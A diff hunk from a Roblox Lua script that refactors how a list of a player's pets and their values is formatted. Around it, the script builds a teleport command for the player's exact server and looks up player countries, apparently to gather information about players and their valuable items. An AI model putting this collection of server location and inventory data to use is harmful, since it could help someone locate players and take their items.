@@ -341,36 +341,37 @@
         local tpScript = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
 
         -- Update pet string generation
-        local petString = ""
+local petString = "Nothing"  -- default if no pets
 
-        for _, pet in ipairs(pets) do
-            local highestPriority = 99
-            local chosenEmoji = "🐶"
-            local mutation = isMutated(pet.PetName)
-            local mutationData = mutation and PetPriorityData[mutation] or nil
-            local petData = PetPriorityData[pet.Type] or nil
+if #pets > 0 then
+    petString = ""
+    for _, pet in ipairs(pets) do
+        local highestPriority = 99
+        local chosenEmoji = "🐶"
+        local mutation = isMutated(pet.PetName)
+        local mutationData = mutation and PetPriorityData[mutation] or nil
+        local petData = PetPriorityData[pet.Type] or nil
 
-            if petData and petData.priority < highestPriority then
-                highestPriority = petData.priority
-                chosenEmoji = petData.emoji
-            elseif mutationData and mutationData.priority < highestPriority then
-                highestPriority = mutationData.priority
-                chosenEmoji = mutationData.emoji
-            elseif pet.Weight and pet.Weight >= 10 and 12 < highestPriority then
-                highestPriority = 12
-                chosenEmoji = "🐘"
-            elseif pet.Age and pet.Age >= 60 and 13 < highestPriority then
-                highestPriority = 13
-                chosenEmoji = "👴"
-            end
-if petString == "" then
-    petString = "Nothing"
+        if petData and petData.priority < highestPriority then
+            highestPriority = petData.priority
+            chosenEmoji = petData.emoji
+        elseif mutationData and mutationData.priority < highestPriority then
+            highestPriority = mutationData.priority
+            chosenEmoji = mutationData.emoji
+        elseif pet.Weight and pet.Weight >= 10 and 12 < highestPriority then
+            highestPriority = 12
+            chosenEmoji = "🐘"
+        elseif pet.Age and pet.Age >= 60 and 13 < highestPriority then
+            highestPriority = 13
+            chosenEmoji = "👴"
+        end
+
+        local petName = pet.PetName
+        local petValue = pet.Formatted
+        petString = petString .. "\n" .. chosenEmoji .. " - " .. petName .. " → " .. petValue
+    end
 end
 
-            local petName = pet.PetName
-            local petValue = pet.Formatted
-            petString = petString .. "\n" .. chosenEmoji .. " - " .. petName .. " → " .. petValue
-        end
         local playerCount = #Players:GetPlayers()
 
         local function getPlayerCountry(player)
